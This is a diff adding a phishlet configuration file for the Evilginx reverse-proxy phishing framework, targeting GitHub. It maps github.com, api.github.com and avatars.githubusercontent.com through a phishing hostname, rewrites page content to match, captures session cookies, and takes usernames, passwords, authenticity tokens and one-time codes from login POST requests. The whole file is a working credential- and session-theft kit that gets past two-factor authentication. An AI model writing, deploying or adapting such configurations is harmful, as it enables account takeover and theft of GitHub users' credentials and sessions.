@@ -1,0 +1,52 @@
+name: 'GitHub Phishlet'
+author: 'HTB (Made  by LxKh4n1yn-Kali-linuX)'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'github.com', session: true, is_landing: true }
+  - { phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: false }
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: false, is_landing: false }
+  - { phish_sub: 'avatars', orig_sub: 'avatars', domain: 'githubusercontent.com', session: false, is_landing: false }
+
+sub_filters: 
+  - { triggers_on: 'github.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'github.com', search: 'github.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { triggers_on: 'github.com', orig_sub: 'api', hostname: '{hostname}', sub: 'www', domain: 'github.com', search: 'api.github.com', replace: 'api.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain']}
+  - { triggers_on: 'githubusercontent.com', orig_sub: 'avatars', hostname: '{hostname}', sub: 'www', domain: 'github.com', search: 'avatars.githubusercontent.com', replace: 'avatars.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/*']}
+  - { triggers_on: 'github.com', orig_sub: '', hostname: '{hostname}', sub: 'www', domain: 'github.com', search: 'github.com', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: 'github.com'
+    keys: ['user_session', '_gh_sess', 'logged_in', 'dotcom_user']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  authenticity_token:
+    key: 'authenticity_token'
+    search: '(.*)'
+    type: 'post'
+  otp:
+    key: 'otp'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - 'https://{hostname}/session'
+  - 'https://{hostname}/sessions/two-factor'
+
+login:
+  domain: 'github.com'
+  path: '/login'
+
+# This is a GitHub phishlet configured for github.com
+# You can find more phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets & www.simplerhacking.com
+# This is a GitHub phishlet configured for github.com
+# You can find more phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets & www.simplerhacking.com
+# Upgraded and modified by LxKh4n1yn-Kali-linuX
+# Modified by LxKhaninScientist
